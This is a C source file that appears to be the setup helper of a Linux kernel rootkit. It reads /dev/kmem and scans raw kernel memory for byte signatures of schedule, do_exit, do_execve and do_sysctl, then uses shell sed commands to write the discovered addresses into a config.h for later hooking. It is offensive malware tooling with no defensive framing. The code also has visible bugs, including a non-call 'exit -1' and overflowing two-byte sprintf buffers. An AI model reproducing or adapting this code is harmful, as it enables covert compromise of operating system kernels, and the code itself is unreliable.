#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>

char *sch_s_pattern[]={"18","fc","ff","ff",NULL};
char *exit_s_pattern[]={"8b","b3","98","00","00","00",NULL};
char *exit_e_pattern[]={"57","56","53",NULL};
char *do_execve_pattern[]={"81","c4","38","01","00","00",NULL};
char *do_sysctl_pattern[]={"83","ec","04","55","57","56","53",NULL};
char *cli="fa";
char computed_address[8];
char *end_string="/g\" config.h > tmpconf";
char *sost_1_string="sed \"s/^\\#define O_E_ADD INSERT/\\#define O_E_ADD 0x";
char *sost_2_string="sed \"s/^\\#define O_F_ADD INSERT/\\#define O_F_ADD 0x";
char *sost_3_string="sed \"s/^\\#define O_EXIT_END INSERT/\\#define O_EXIT_END 0x";
char *sost_4_string="sed \"s/^\\#define O_DO_EXECVE_END INSERT/\\#define O_DO_EXECVE_END 0x";
char *sost_5_string="sed \"s/^\\#define CODEBACK1 INSERT/\\#define CODEBACK1 ";
char *sost_6_string="sed \"s/^\\#define O_DO_SYSCTL INSERT/\\#define O_DO_SYSCTL 0x";
char command_string[100];

int isNotOp(unsigned char dati);
int isMov(unsigned char buf[]);
int main (int argc, char *argv[]) {

	int file,pos,times;
	unsigned long address_exit,address_schedule,runner,address_result;
	unsigned char data;
	unsigned char backuped;
	unsigned long offset;
	unsigned char buffer[2];
		if((file=open("/dev/kmem",O_RDONLY))==-1)
			exit -1;

	address_schedule=(unsigned long)0xc0100000;
	lseek(file,address_schedule,SEEK_SET);
	runner=pos=times=0;
	while(1) {
		read(file,&data,1);
		sprintf(buffer,"%.2x",data);
		 if(!(strcmp(buffer,sch_s_pattern[pos]))) {
                          if((pos==3)&&(times==3)) {
				  address_schedule-=3;
				  lseek(file,-5,SEEK_CUR); //Ora sia address_schedule che il fp puntano al primo byte prima dell'inizio del
				  			// pattern
				runner++;
				read(file,&data,1);
				sprintf(buffer,"%.2x",data);
				  
				while(!(isMov(buffer))) {
SPIN:					runner++;
					address_schedule--;
					lseek(file,-2,SEEK_CUR);
					read(file,&data,1);
					sprintf(buffer,"%.2x",data);
				}
				if(runner+4<7)
					goto SPIN;

				sprintf(computed_address,"%x",address_schedule-1);
                                strcat(command_string,sost_2_string);
                                strcat(command_string,computed_address);
                                strcat(command_string,end_string);
                                system(command_string);
                                system("mv tmpconf config.h");
				memset(command_string,0,sizeof(command_string));
				sprintf(computed_address,"%d",runner+4);
				strcat(command_string,sost_5_string);
				strcat(command_string,computed_address);
				strcat(command_string,end_string);
				system(command_string);
				system("mv tmpconf config.h");
				
                                break;
																												
				  
			  }
			  if((pos==3)&&(times<3)){
				  times++;
				  goto RESET;
			  }
			 pos++;
		 }
		 else 
RESET:			 pos=0;
		
		 address_schedule++;
			 
	}
	pos=0;
	memset(command_string,0,sizeof(command_string));

	while(1) {
		backuped=data;
		read(file,&data,1);
		sprintf(buffer,"%.2x",data);
			if( (!(strcmp(buffer,cli))) && (isNotOp(backuped)) ) {
				while(1) {
					read(file,&data,1);
					sprintf(buffer,"%.2x",data);
					   if(isMov(buffer)) { 

							sprintf(computed_address,"%x",address_schedule+1);
							strcat(command_string,sost_1_string);
			                                strcat(command_string,computed_address);
			                                strcat(command_string,end_string);
			                                system(command_string);
			                                system("mv tmpconf config.h");
							goto EXIT;
						}
						else
							 address_schedule++;
				}
				
			}
			
		address_schedule++;

	}

EXIT:	pos=0;
	memset(command_string,0,sizeof(command_string));
	while(1) {
		read(file,&data,1);
		sprintf(buffer,"%.2x",data);
		if(!(strcmp(buffer,exit_s_pattern[pos]))) {
			if(pos==5) {
				pos=0;
				while(1) {
					read(file,&data,1);
					sprintf(buffer,"%.2x",data);
					if(!(strcmp(buffer,exit_e_pattern[pos]))) {
						if(pos==2) {
							sprintf(computed_address,"%x",
								address_schedule
								-6);
 							strcat(command_string,sost_3_string);
							        strcat(command_string,computed_address);
								        strcat(command_string,end_string);
									        system(command_string);
										        system("mv tmpconf config.h");
											
							break;
						}
						pos++;
					}
					else
						pos=0;
					
					address_schedule++;
				}
				break;
				
			}
			pos++;
		}
		else
			pos=0;
		address_schedule++;
	}

	times=pos=0;
	memset(command_string,0,sizeof(command_string));
	
        while(1) {
                read(file,&data,1);
                sprintf(buffer,"%.2x",data);
                 if(!(strcmp(buffer,do_sysctl_pattern[pos]))) {
                          if((pos==6)&&(times==1)) {
				sprintf(computed_address,"%x",address_schedule-2);
                                strcat(command_string,sost_6_string);
                                strcat(command_string,computed_address);
                                strcat(command_string,end_string);
                                system(command_string);
                                system("mv tmpconf config.h");
				address_schedule++;
				break;
			  }
			  if((pos==6)&&(times<1)) {
				  times++;
				  goto RESTART;
			  }

			pos++;
		 }
		 else
RESTART:		 pos=0;
		 address_schedule++;
	}
			
	pos=0;
        memset(command_string,0,sizeof(command_string));
	
	while(1) {
		read(file,&data,1);
		sprintf(buffer,"%.2x",data);
			if(!(strcmp(buffer,do_execve_pattern[pos]))) {
				if(pos==5) {
					sprintf(computed_address,"%x",address_schedule-1);
					strcat(command_string,sost_4_string);
					strcat(command_string,computed_address);
					strcat(command_string,end_string);
					system(command_string);
					system("mv tmpconf config.h");
					break;
				}
				else
					pos++;
			}
			else
				pos=0;
			
		address_schedule++;
	}
				
	return 0;
}

int isNotOp(unsigned char dati) {
	int counter;
	unsigned char buf[2];
	unsigned char *patterns[]={"39","d1","81","89","83","c7",NULL};
	sprintf(buf,"%.2x",dati);
	counter=0;
		for(;counter<6;counter++)
			if((strstr(buf,patterns[counter]))) 
				return 0;
	return 1;
}

int isMov(unsigned char buffer[]) {
	int counter;
	unsigned char *patterns[]={"8b","89","b8","bf","c7",NULL};
	counter=0;
		for(;counter<5;counter++)
			if((strstr(buffer,patterns[counter])))
				return 1;
	return 0;
}
